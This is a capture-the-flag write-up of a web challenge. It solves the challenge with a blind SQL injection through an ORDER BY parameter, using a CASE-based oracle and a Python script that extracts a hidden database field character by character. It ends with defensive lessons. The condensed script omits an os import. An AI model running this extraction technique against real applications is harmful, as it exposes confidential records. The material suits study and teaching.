# FortID CTF 2026 Writeup: Doctor Bye Bye

- **Category:** Web
- **Challenge author:** dsantl
- **Points / Solves:** 125 pts / 112 solves
- **Flag:** `FortID{D0C_1M_0UTT4_H3R3_a54129aba0}`

---

## Challenge

> Dr. Bye Bye has retired from St. Codd's Hospital.
>
> The hospital insists that retired records can never be displayed. Can you
> recover Dr. Bye Bye's private farewell note anyway?

---

## Summary

A Python `http.server` app exposes `/api/on-call?sort=<expr>`, interpolating
`sort` directly into the `ORDER BY` clause of a SQLite query. Retired staff
(`listed = 0`, including `doctor-bye-bye` whose `farewell_note` is the flag) are
filtered out by `WHERE listed = 1`, and the response only ever returns the
first row. A boolean-CASE trick turns the ordering of the listed rows into a
one-bit oracle, making it a textbook blind SQL injection.

## Solution

### Step 1: Confirm the injection and build an oracle

`select_on_call()` in `src/app.py` builds:

```sql
SELECT name, specialty, room FROM doctors WHERE listed = 1 ORDER BY {sort} LIMIT 1
```

Errors are masked ("The on-call board could not be updated"), so extraction must
be blind. Ordering the five listed rows by

```sql
CASE WHEN (<condition>) THEN id ELSE -id END
```

returns **Dr. Ada Pulse** (id 10) when the condition is true, and
**Dr. Zoe Last** (id 90) when it is false — one boolean per request. The flag is
reachable through a scalar subquery on the hidden row.

### Step 2: Binary-search length, then each character

```python
import json, ssl, urllib.parse, urllib.request
HOST = os.environ["HOST"]
URL = f"https://{HOST}:443/api/on-call"
CTX = ssl._create_unverified_context()
NOTE = "(SELECT farewell_note FROM doctors WHERE slug='doctor-bye-bye')"

def ask(cond):
    expr = f"CASE WHEN ({cond}) THEN id ELSE -id END"
    url = URL + "?sort=" + urllib.parse.quote(expr, safe="")
    name = json.loads(urllib.request.urlopen(url, context=CTX).read())["doctor"]["name"]
    return name == "Dr. Ada Pulse"

def binary_search(pred, lo, hi):        # pred(n) -> bool, find largest n with pred false boundary
    while lo < hi:
        mid = (lo + hi) // 2
        if pred(mid): lo = mid + 1
        else: hi = mid
    return lo

n = binary_search(lambda m: ask(f"(SELECT length(farewell_note) FROM doctors WHERE slug='doctor-bye-bye') > {m}"), 1, 200)
flag = "".join(chr(binary_search(lambda m: ask(f"(SELECT unicode(substr(farewell_note,{i},1)) FROM doctors WHERE slug='doctor-bye-bye') > {m}"), 32, 126))
               for i in range(1, n + 1))
print(flag)
```

```text
$ python3 solve.py HOST 443
[*] flag length: 36
FortID{D0C_1M_0UTT4_H3R3_a54129aba0}
```

The full re-runnable script (parallel character extraction, host/port args) is
`solve.py`.

## Flag

```text
FortID{D0C_1M_0UTT4_H3R3_a54129aba0}
```

## Lessons

* Never interpolate request data into SQL, and especially not into `ORDER BY`,
  which accepts arbitrary expressions and scalar subqueries even when the
  SELECT list is fixed.
* Row-level filtering (`WHERE listed = 1`) is not a confidentiality boundary: a
  subquery in the ordering expression reads out-of-band rows.
* A stable, distinguishable response (here: which of two doctors is returned
  first) is enough for full blind extraction; "no error details" is not a
  mitigation.
